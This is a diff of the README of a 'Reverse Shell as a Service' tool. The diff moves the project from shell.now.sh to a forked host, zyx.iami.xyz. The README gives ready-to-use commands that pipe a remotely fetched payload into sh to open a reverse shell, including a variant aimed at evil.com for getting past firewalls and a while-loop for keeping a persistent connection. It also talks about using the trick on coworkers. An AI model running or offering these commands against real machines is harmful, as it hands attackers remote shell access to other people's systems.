@@ -1,14 +1,6 @@
 # reverse-shell
 
-> Reverse Shell as a Service - https://shell.now.sh
-
-[![Build Status](https://travis-ci.org/lukechilds/reverse-shell.svg?branch=master)](https://travis-ci.org/lukechilds/reverse-shell)
-[![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
-[![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)
-
-Easy to remember reverse shell that should work on most Unix-like systems.
-
-Detects available software on the target and runs an appropriate payload.
+> Reverse Shell as a Service - https://zyx.iami.xyz modified from https://github.com/lukechilds/reverse-shell and host it in https://www.openode.io/
 
 ## Usage
 
@@ -21,10 +13,9 @@ nc -l 1337
 ```
 ### 2. Execute reverse shell on target
 
-On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.
 
 ```shell
-curl https://shell.now.sh/192.168.0.69:1337 | sh
+curl https://zyx.iami.xyz/192.168.0.69:1337 | sh
 ```
 
 Go back to your machine, you should now have a shell prompt.
@@ -44,7 +35,7 @@ This is meant to be used for pentesting or helping coworkers understand why they
 You can use a hostname instead of an IP.
 
 ```shell
-curl https://shell.now.sh/localhost:1337 | sh
+curl https://zyx.iami.xyz/localhost:1337 | sh
 ```
 
 ### Remote connections
@@ -54,7 +45,7 @@ Because this is a reverse connection it can punch through firewalls and connect 
 You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.
 
 ```shell
-curl https://shell.now.sh/evil.com:1337 | sh
+curl https://zyx.iami.xyz/evil.com:1337 | sh
 ```
 
 ### Reconnecting
@@ -62,7 +53,7 @@ curl https://shell.now.sh/evil.com:1337 | sh
 By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.
 
 ```shell
-while true; do curl https://shell.now.sh/yourip:1337 | sh; done
+while true; do curl https://zyx.iami.xyz/yourip:1337 | sh; done
 ```
 
 Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.
